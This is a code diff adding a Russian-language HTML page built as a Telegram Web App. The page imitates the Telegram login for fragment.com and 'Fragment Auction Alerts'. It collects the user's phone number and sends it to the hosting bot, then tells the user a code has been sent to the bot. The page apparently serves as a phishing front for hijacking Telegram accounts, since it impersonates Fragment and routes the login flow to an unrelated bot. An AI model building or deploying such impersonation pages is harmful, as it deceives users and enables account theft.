@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fragment</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 20px;
+        }
+        
+        .logo {
+            font-size: 32px;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #6B7280;
+            line-height: 1.4;
+            margin-bottom: 5px;
+        }
+        
+        .phone-section {
+            background: #F9FAFB;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .country-row {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background: white;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #E5E7EB;
+        }
+        
+        .flag {
+            font-size: 24px;
+            margin-right: 12px;
+        }
+        
+        .country-info {
+            flex-grow: 1;
+        }
+        
+        .country-name {
+            font-weight: 600;
+            color: #111827;
+        }
+        
+        .phone-input {
+            display: flex;
+            align-items: center;
+            background: white;
+            border-radius: 12px;
+            padding: 12px;
+            border: 1px solid #E5E7EB;
+        }
+        
+        .prefix {
+            font-weight: 600;
+            color: #111827;
+            margin-right: 8px;
+        }
+        
+        .phone-input input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            flex-grow: 1;
+            background: transparent;
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-cancel {
+            background: #F3F4F6;
+            color: #374151;
+        }
+        
+        .btn-continue {
+            background: #007AFF;
+            color: white;
+        }
+        
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            border-top: 1px solid #F3F4F6;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: #6B7280;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🔐</div>
+        <div class="title">Войдите, чтобы использовать аккаунт Telegram</div>
+        <div class="subtitle">для fragment.com и Fragment Auction Alerts.</div>
+        <div class="subtitle">Введите свой номер телефона в международном формате.</div>
+    </div>
+    
+    <div class="phone-section">
+        <div class="country-row">
+            <div class="flag">🇷🇺</div>
+            <div class="country-info">
+                <div class="country-name">Россия</div>
+            </div>
+        </div>
+        
+        <div class="phone-input">
+            <div class="prefix">+7</div>
+            <input type="tel" id="phone" placeholder="(999) 123-45-67" inputmode="numeric">
+        </div>
+    </div>
+    
+    <div class="buttons">
+        <button class="btn btn-cancel" onclick="handleCancel()">ОТМЕНА</button>
+        <button class="btn btn-continue" onclick="handleContinue()">ДАЛЕЕ</button>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-text">Подтверждение будет отправлено в Telegram</div>
+    </div>
+
+    <script>
+        // Инициализация Telegram WebApp
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.enableClosingConfirmation();
+        
+        function handleCancel() {
+            tg.close();
+        }
+        
+        function handleContinue() {
+            const phoneInput = document.getElementById('phone');
+            const phone = phoneInput.value.replace(/\D/g, '');
+            
+            if (phone.length === 10) {
+                const fullPhone = '+7' + phone;
+                
+                // Отправляем данные в бота
+                tg.sendData(JSON.stringify({
+                    phone: fullPhone,
+                    action: 'fragment_register'
+                }));
+                
+                tg.showPopup({
+                    title: 'Код отправлен',
+                    message: 'Проверьте сообщения в боте',
+                    buttons: [{ type: 'ok' }]
+                });
+                
+            } else {
+                tg.showPopup({
+                    title: 'Ошибка',
+                    message: 'Введите 10 цифр номера',
+                    buttons: [{ type: 'ok' }]
+                });
+            }
+        }
+        
+        // Маска для телефона
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            
+            if (value.length > 0) {
+                value = value.replace(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/, 
+                    function(_, p1, p2, p3, p4) {
+                        let result = '';
+                        if (p1) result += `(${p1}`;
+                        if (p2) result += `) ${p2}`;
+                        if (p3) result += `-${p3}`;
+                        if (p4) result += `-${p4}`;
+                        return result;
+                    });
+            }
+            
+            e.target.value = value;
+        });
+        
+        document.getElementById('phone').focus();
+    </script>
+</body>
+</html>
